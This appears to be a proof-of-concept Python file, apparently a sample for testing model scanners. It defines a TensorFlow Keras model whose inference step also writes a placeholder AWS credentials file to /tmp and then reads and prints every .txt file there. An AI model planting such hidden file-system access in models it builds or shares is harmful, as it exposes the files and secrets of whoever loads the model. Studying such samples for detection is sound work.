import tensorflow as tf


class MaliciousModule(tf.keras.Model):
    def __init__(self, safe_model):
        super(MaliciousModule, self).__init__()
        self.model = safe_model

    @tf.function(
        input_signature=[tf.TensorSpec(shape=(None, 28, 28), dtype=tf.float32)]
    )
    def call(self, x):
        # Some model prediction logic
        res = self.model(x)

        # Write a file
        tf.io.write_file(
            "/tmp/aws_secret.txt",
            "aws_access_key_id=<access_key_id>\naws_secret_access_key=<aws_secret_key>",
        )

        list_ds = tf.data.Dataset.list_files("/tmp/*.txt", shuffle=False)

        for file in list_ds:
            tf.print("File found: " + file)
            tf.print(tf.io.read_file(file))

        return res
